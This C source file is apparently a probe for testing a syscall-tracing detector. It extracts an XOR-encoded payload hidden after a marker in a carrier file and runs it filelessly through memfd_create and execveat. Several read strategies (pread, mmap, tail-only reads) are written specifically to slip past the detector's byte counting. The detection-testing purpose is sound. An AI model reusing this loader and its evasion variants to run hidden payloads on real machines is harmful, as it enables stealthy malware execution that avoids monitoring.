/* Parameterized fileless-exec probe for the dynamic evaluation.
 *
 * Reads a carrier file via a chosen strategy, then fileless-execs a payload via
 * memfd_create + execveat. Right before execveat it snapshots /proc/self/io and
 * prints "IOSTAT rchar=<n> wchar=<n> mapped=<n>" on stderr: rchar/wchar are the
 * kernel's own read/write byte counters, i.e. the exact quantity hunt.bt sums at
 * the read/write tracepoints; mapped = carrier bytes this process mmap'd. The
 * read STRATEGY is the knob that exposes the detector's syscall coverage:
 *   read  : read()      -> counted by rchar AND by hunt.bt (sys_exit_read)
 *   chunk : read() loop -> same
 *   pread : pread()     -> counted by rchar, NOT by hunt.bt (no pread hook)
 *   mmap  : mmap()      -> counted by NEITHER (no read syscall at all)
 *   tail     : pread() 4K pages backwards from EOF until MAGIC is found
 *   mmaptail : mmap() 1 page at a time backwards from EOF until MAGIC is found
 *   exact    : tail, then pread() exactly the payload bytes at their offset
 * The tail strategies only touch the trailing region that holds an appended
 * payload, so the cover never enters the byte count.
 *
 * Modes:
 *   stego    : find MAGIC in the carrier, XOR-decode, write the result to the memfd
 *   stegoraw : same, payload stored unencoded (no decode step)
 *   plain : ignore carrier bytes, write the embedded payload (benign fileless)
 *
 * Usage: probe <stego|stegoraw|plain> <read|chunk|pread|mmap|tail|mmaptail|exact> <carrier> [write_pad]
 * See docs/dynamic-detection.md.
 */
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include "payload_blob.h"

#ifndef AT_EMPTY_PATH
#define AT_EMPTY_PATH 0x1000
#endif

static const unsigned char MAGIC[4] = {'S', 'T', 'G', 'O'};
static size_t mapped;

/* Load the whole carrier via the chosen strategy; return bytes and set *n. */
static unsigned char *load(const char *path, const char *how, size_t *n) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) { perror("open carrier"); exit(1); }
    struct stat st;
    fstat(fd, &st);
    size_t sz = st.st_size;
    unsigned char *buf = calloc(1, sz);
    *n = sz;
    size_t pg = (size_t)sysconf(_SC_PAGESIZE);

    if (!strcmp(how, "mmap")) {
        unsigned char *m = mmap(NULL, sz, PROT_READ, MAP_PRIVATE, fd, 0);
        if (m == MAP_FAILED) { perror("mmap"); exit(1); }
        mapped += sz;
        memcpy(buf, m, sz);           /* no read syscall: rchar stays 0 */
        munmap(m, sz);
    } else if (!strcmp(how, "tail") || !strcmp(how, "exact")) {
        size_t off = sz;
        unsigned char *hit = NULL;
        while (off > 0) {
            size_t step = off < 4096 ? off : 4096;
            off -= step;
            if (pread(fd, buf + off, step, off) <= 0) break;
            if ((hit = memmem(buf + off, sz - off, MAGIC, sizeof MAGIC))) break;
        }
        if (hit && !strcmp(how, "exact")) {
            unsigned int len;
            memcpy(&len, hit + 4, 4);
            off_t at = hit - buf + 8;
            pread(fd, buf + at, len, at);
        }
    } else if (!strcmp(how, "mmaptail")) {
        size_t off = (sz - 1) / pg * pg;
        for (;;) {
            size_t len = (sz - off) < pg ? sz - off : pg;
            unsigned char *m = mmap(NULL, len, PROT_READ, MAP_PRIVATE, fd, off);
            if (m == MAP_FAILED) { perror("mmap"); exit(1); }
            mapped += len;
            memcpy(buf + off, m, len);
            munmap(m, len);
            if (memmem(buf + off, sz - off, MAGIC, sizeof MAGIC) || off == 0) break;
            off -= pg;
        }
    } else if (!strcmp(how, "pread")) {
        size_t off = 0;
        while (off < sz) {
            ssize_t r = pread(fd, buf + off, sz - off, off);
            if (r <= 0) break;
            off += r;
        }
    } else if (!strcmp(how, "chunk")) {
        size_t off = 0;
        while (off < sz) {
            ssize_t r = read(fd, buf + off, 4096 < sz - off ? 4096 : sz - off);
            if (r <= 0) break;
            off += r;
        }
    } else {                          /* "read": one big read() */
        if (read(fd, buf, sz) < 0) { perror("read"); exit(1); }
    }
    close(fd);
    return buf;
}

/* rchar/wchar from /proc/self/io at the moment of the fileless exec. */
static void io_snapshot(unsigned long long *rchar, unsigned long long *wchar) {
    FILE *f = fopen("/proc/self/io", "r");
    *rchar = *wchar = 0;
    char k[32];
    unsigned long long v;
    while (f && fscanf(f, "%31[^:]: %llu\n", k, &v) == 2) {
        if (!strcmp(k, "rchar")) *rchar = v;
        else if (!strcmp(k, "wchar")) *wchar = v;
    }
    if (f) fclose(f);
}

int main(int argc, char **argv) {
    if (argc < 4) {
        fprintf(stderr, "usage: %s <stego|stegoraw|plain> <read|chunk|pread|mmap|tail|mmaptail|exact> "
                        "<carrier> [write_pad]\n", argv[0]);
        return 2;
    }
    const char *mode = argv[1], *how = argv[2], *carrier = argv[3];
    size_t pad = argc > 4 ? (size_t)strtoul(argv[4], NULL, 10) : 0;

    unsigned long long r0, w0;
    io_snapshot(&r0, &w0);            /* baseline: subtract stdio/loader noise */

    size_t n;
    unsigned char *buf = load(carrier, how, &n);

    unsigned char *out;
    size_t outlen;
    if (!strncmp(mode, "stego", 5)) {
        unsigned char key = strcmp(mode, "stegoraw") ? 0x5A : 0;
        unsigned char *p = memmem(buf, n, MAGIC, sizeof MAGIC);
        if (!p) { fprintf(stderr, "no STGO magic in %s\n", carrier); return 3; }
        unsigned int len;
        memcpy(&len, p + 4, 4);
        out = malloc(len);
        outlen = len;
        for (unsigned int i = 0; i < len; i++) out[i] = (p + 8)[i] ^ key;
    } else {                          /* plain: write embedded payload */
        outlen = PAYLOAD_LEN + pad;
        out = calloc(1, outlen);
        memcpy(out, PAYLOAD, PAYLOAD_LEN);
    }

    int mfd = memfd_create("x", MFD_CLOEXEC);
    if (mfd < 0) { perror("memfd_create"); return 4; }
    if (write(mfd, out, outlen) != (ssize_t)outlen) { perror("write mfd"); return 4; }

    unsigned long long rchar, wchar;
    io_snapshot(&rchar, &wchar);      /* snapshot BEFORE the print below */
    fprintf(stderr, "IOSTAT rchar=%llu wchar=%llu mapped=%zu\n",
            rchar - r0, wchar - w0, mapped);

    char *av[] = {"x", NULL}, *ev[] = {NULL};
    syscall(SYS_execveat, mfd, "", av, ev, AT_EMPTY_PATH);
    perror("execveat");
    return 5;
}
